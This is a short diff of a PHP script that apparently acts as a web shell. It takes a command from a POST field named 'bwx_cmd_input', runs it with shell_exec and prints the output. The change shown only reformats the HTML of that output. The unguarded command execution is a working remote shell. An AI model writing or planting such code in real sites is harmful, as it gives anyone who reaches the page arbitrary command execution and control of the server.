@@ -4,8 +4,12 @@ $_cmd_in = $_POST["bwx_cmd_input"]; # array key such as 'bwx.cmd.input' may caus
 $_shex_out = shell_exec("$_cmd_in");
 
 echo "<pre>
-command input: $_cmd_in <br/>
-execution result: $_shex_out <br/>
+<b>command input</b>:
+$_cmd_in 
+
+<b>execution result</b>:
+$_shex_out
+
 </pre>
 ";
 
